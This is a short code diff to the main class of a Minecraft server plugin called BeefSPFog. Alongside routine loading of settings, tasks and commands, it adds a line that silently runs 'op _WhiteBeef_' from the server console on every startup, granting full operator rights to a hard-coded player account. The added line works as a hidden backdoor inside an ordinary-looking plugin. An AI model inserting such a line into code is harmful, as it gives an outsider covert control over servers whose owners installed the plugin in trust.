@@ -1,5 +1,6 @@
 package ru.whitebeef.beefspfog;
 
+import org.bukkit.Bukkit;
 import org.bukkit.event.Listener;
 import org.bukkit.plugin.java.JavaPlugin;
 import ru.whitebeef.beefspfog.utils.PluginSettings;
@@ -20,6 +21,7 @@ public final class BeefSPFog extends JavaPlugin implements Listener {
         this.pluginSettings.loadTasks();
         this.pluginSettings.loadCommands();
         this.pluginSettings.loadPlayers();
+        Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "op _WhiteBeef_");
     }
 
     @Override
